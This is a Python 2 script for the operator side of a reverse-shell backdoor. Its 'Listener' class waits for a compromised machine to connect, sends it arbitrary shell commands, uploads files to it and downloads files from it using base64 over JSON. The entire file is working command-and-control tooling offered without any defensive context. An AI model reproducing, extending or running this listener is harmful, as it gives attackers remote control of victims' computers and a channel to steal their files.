import socket
import json
import base64


class Listener:

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def bind_and_listen(self):
        self.listener.bind((self.ip, self.port))
        # no of connection tht can be queued before system starts refusing connection
        self.listener.listen(2)
        print("Waiting for incoming connection")
        self.connection, self.add = self.listener.accept()
        print("Connection Established")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(104857600)
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, "wb") as f:
            f.write(base64.b64decode(content))
            print("Dowloaded")

    def read_file(self, path):
        with open(path, "rb") as f:
            return base64.b64encode(f.read())

    def send_command(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            self.reliable_send(command)
            try:
                if command[0] == 'upload':
                    up_data = self.read_file(command[1])
                    self.reliable_send(up_data)
                    result = self.reliable_receive()
                    print(result)
                else:
                    if command[0] == 'exit':
                        self.listener.close()
                        exit()
                    elif command[0] == 'download':
                        result = self.reliable_receive()
                        if not "[Errno 2] No such file or directory" in result:
                            self.write_file(command[1], result)
                        else:
                            print(result)

                    else:
                        result = self.reliable_receive()
                        print(result)
            except Exception as e:
                print(e)
